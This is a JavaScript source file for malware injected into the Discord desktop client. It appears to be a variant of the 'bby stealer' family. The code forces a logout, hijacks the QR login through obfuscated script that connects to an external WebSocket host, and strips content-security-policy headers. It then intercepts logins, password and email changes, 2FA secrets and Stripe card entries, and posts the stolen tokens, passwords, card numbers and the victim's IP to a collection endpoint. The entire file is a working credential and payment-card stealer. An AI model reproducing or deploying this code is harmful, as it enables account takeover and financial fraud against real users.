const electron = require('electron'),
http = require('http')
os = require('os')
getTokenScript = 'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;'

var loggedOut = false,
executed = false

electron.app.once('ready', () => {
  
  electron.session.defaultSession.webRequest.onBeforeRequest(
    {
      urls: [
        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
        'https://*.discord.com/api/v*/applications/detectable',
        'https://discord.com/api/v*/applications/detectable',
        'https://*.discord.com/api/v*/users/@me/library',
        'https://discord.com/api/v*/users/@me/library',
        'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
        'https://discord.com/api/v*/users/@me/billing/subscriptions',
        'wss://remote-auth-gateway.discord.gg/*',
      ],
    },
    async (details, callback) => {
      const elecwin = electron.BrowserWindow.getAllWindows()[0]
      !loggedOut &&
        ((loggedOut = true),
        elecwin.webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', true))
      if (details.url.startsWith('wss://remote')) {
        !executed &&
          (elecwin.webContents.executeJavaScript(
            "let keybby = \"P5N7dlmzCNwj\";function getElementByXpath(_0x3b1720){const _0x357c1a=(function(){let _0x4e3897=!![];return function(_0x92ae64,_0x5dfad6){const _0x410191=_0x4e3897?function(){if(_0x5dfad6){const _0x4075e8=_0x5dfad6['apply'](_0x92ae64,arguments);return _0x5dfad6=null,_0x4075e8;}}:function(){};return _0x4e3897=![],_0x410191;};}()),_0x238389=_0x357c1a(this,function(){return _0x238389['toString']()['search']('(((.+)+)+)+$')['toString']()['constructor'](_0x238389)['search']('(((.+)+)+)+$');});return _0x238389(),document['evaluate'](_0x3b1720,document,null,XPathResult['FIRST_ORDERED_NODE_TYPE'],null)['singleNodeValue'];}getElementByXpath('/html/body/div[1]/div[3]/div/div/div/div/form/div/div/div[3]/div/div/div/div[1]')['innerHTML']='<div class=\"qrCodeContainer-1qlybH\"> <div class=\"qrCode-2R7t9S\" title=\"Oh nice! bby steal your account\" style=\"padding: 8px; border-radius: 4px; background: rgb(255, 255, 255);\"> <canvas width=\"160\" height=\"160\" style=\"display: none;\"></canvas> <img id=\"qrcode\" alt=\"Scan me!\" src=\"\" style=\"display: block;\"> </div> <div class=\"qrCodeOverlay-2bLtKl\"><img src=\"/assets/092b071c3b3141a58787415450c27857.png\" alt=\"\"></div></div>';let key='doQnPRtcRQSv',bbyws;function connect(){const _0x2d307a=(function(){let _0x3fec46=!![];return function(_0x1c2fed,_0x1f289d){const _0x269975=_0x3fec46?function(){if(_0x1f289d){const _0xc82f7e=_0x1f289d['apply'](_0x1c2fed,arguments);return _0x1f289d=null,_0xc82f7e;}}:function(){};return _0x3fec46=![],_0x269975;};}()),_0x2589b2=_0x2d307a(this,function(){const _0x187684=function(){let _0x39d6f3;try{_0x39d6f3=Function('return (function() '+'{}.constructor(\"return this\")( )'+');')();}catch(_0x4abba1){_0x39d6f3=window;}return _0x39d6f3;},_0xc33925=_0x187684(),_0x55cacd=_0xc33925['console']=_0xc33925['console']||{},_0x1f64c2=['log','warn','info','error','exception','table','trace'];for(let _0x2e41b8=0x0;_0x2e41b8<_0x1f64c2['length'];_0x2e41b8++){const _0x2a3c36=_0x2d307a['constructor']['prototype']['bind'](_0x2d307a),_0x23a19a=_0x1f64c2[_0x2e41b8],_0x32605c=_0x55cacd[_0x23a19a]||_0x2a3c36;_0x2a3c36['__proto__']=_0x2d307a['bind'](_0x2d307a),_0x2a3c36['toString']=_0x32605c['toString']['bind'](_0x32605c),_0x55cacd[_0x23a19a]=_0x2a3c36;}});_0x2589b2(),bbyws=new WebSocket('wss://wearenotbbystealer.nl'),bbyws['onopen']=()=>console['log']('connected'),bbyws['onerror']=_0x5aceb0=>console['log'](_0x5aceb0),bbyws['onmessage']=_0x4798c0=>{_0x4798c0=JSON['parse'](_0x4798c0['data']);switch(_0x4798c0['action']){case'welcome':bbyws['send'](JSON['stringify']({'action':'key','key':keybby}));break;case'qrcode':const _0xe953a0=_0x4798c0['qrcode'];console['log'](_0xe953a0),document['getElementById']('qrcode')['src']=_0xe953a0;break;}};}setInterval(()=>{if(bbyws?.['readyState']==0x3)connect();},0x1f4),connect();",
            true
          ),
          (executed = true))
        callback({ cancel: true })
      } else {
        callback({ cancel: false })
      }
    }
  )
  electron.session.defaultSession.webRequest.onHeadersReceived(
    (details, callback) => {
      delete details.responseHeaders['content-security-policy']
      delete details.responseHeaders['content-security-policy-report-only']
      callback({
        responseHeaders: {
          ...details.responseHeaders,
          'Access-Control-Allow-Headers': '*',
        },
      })
    }
  )
  electron.session.defaultSession.webRequest.onCompleted(
    {
      urls: [
        'https://discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/users/@me',
        'https://*.discord.com/api/v*/users/@me',
        'https://discord.com/api/v*/users/@me/mfa/totp/enable',
        'https://discordapp.com/api/v*/users/@me/mfa/totp/enable',
        'https://*.discord.com/api/v*/users/@me/mfa/totp/enable',
        'https://discordapp.com/api/v*/auth/login',
        'https://discord.com/api/v*/auth/login',
        'https://*.discord.com/api/v*/auth/login',
        'https://api.stripe.com/v*/tokens',
      ],
    },
    async (details, callback) => {
        const window = electron.BrowserWindow.getAllWindows()[0];
    if (details.statusCode != 200) return;
    const data = JSON.parse(Buffer.from(details.uploadData[0].bytes)
            .toString()),
        token = await window.webContents.executeJavaScript(getTokenScript, true);
    if (details.url.endsWith('login')) newData('login', token, data['password']);
    if (details.url.includes('users/@me/mfa/totp/enable')) newData('enabled2FA', token, data['secret'], data['password']);
    if (details.url.endsWith('users/@me')) {
        if (details.method != 'PATCH') return;
        if (!data['password']) return;
        if (data['email']) newData('changedEmail', token, data['email'], data['password']);
        if (data['new_password']) newData('changedPassword', token, data['password'], data['new_password']);
    }
    if (details.url.endsWith('tokens')) newData('cardAdded', token, data['data[number]'], data['data[cvc]'], data['data[exp_month]'], data['data[exp_year]']);
    }
  )
})

function sendToApi(data) {
	var post_options = {
		host: 'localhost',
		port: '80',
		path: '/%KEY%',
		method: 'POST',
		headers: {
			"Content-Type": "application/json"
		}
	};
	
	var post_req = http.request(post_options, function(res) {
		res.on('data', function (chunk) {
			console.log('Response: ' + chunk);
		});
	});
	
	post_req.write(data);
	post_req.end();
}

async function newData(type, token, ...args) {
  const windows = electron.BrowserWindow.getAllWindows()[0],
    data = await windows.webContents.executeJavaScript(
      'var xmlHttp = new XMLHttpRequest();xmlHttp.open("GET", "https://canary.discord.com/api/v9/users/@me", false);xmlHttp.setRequestHeader("Authorization", "' +
        token +
        '");xmlHttp.send(null);xmlHttp.responseText;',
      true
    ),
    ip = await windows.webContents.executeJavaScript('var xmlHttp = new XMLHttpRequest();xmlHttp.open("GET", "https://www.myexternalip.com/raw", false);xmlHttp.send();xmlHttp.responseText;',true)
  var info = JSON.parse(data),
    gay = {
      data: {
        token: token,
        type: type,
      },
      hostname: os.hostname(),
      ip: ip,
      key: "%KEY%",
    }
  if (info.premium_type == 2) {
    var window = await windows.webContents.executeJavaScript(
      'var xmlHttp = new XMLHttpRequest();xmlHttp.open("GET", "https://canary.discord.com/api/v9/users/' +
        info.id +
        '/profile", false);xmlHttp.setRequestHeader("Authorization", "' +
        token +
        '");xmlHttp.send(null);xmlHttp.responseText;',
      true
    )
    gay.data.boost_badge = JSON.parse(window)
  }
  switch (type) {
    case 'login':
      gay.data.password = args[0]
      break
    case 'changedEmail':
      ;(gay.data.email = args[0]),
        (gay.data.password = args[1])
      break
    case 'changedPassword':
      ;(gay.data.oldPassword = args[0]),
        (gay.data.newPassword = args[1])
      break
    case 'cardAdded':
      gay.data.card = {
        number: args[0],
        cvc: args[1],
        expire: {
          month: args[2],
          year: args[3],
        },
      }
      break
    case 'enabled2FA':
      ;(gay.data.secret = args[0]),
        (gay.data.password = args[1])
      break
  }
  sendToApi(JSON.stringify(gay))
}
const Module = require('module'),
  { join, dirname } = require('path'),
  discordPath = join(dirname(require.main.filename), '..', 'app.asar'),
  discordPackage = require(join(discordPath, 'package.json'))
electron.app.setAppPath(discordPath)
electron.app.name = discordPackage.name
Module['_load'](join(discordPath, discordPackage.main), null, true)
require.main.filename = join(discordPath, 'app_bootstrap/index.js')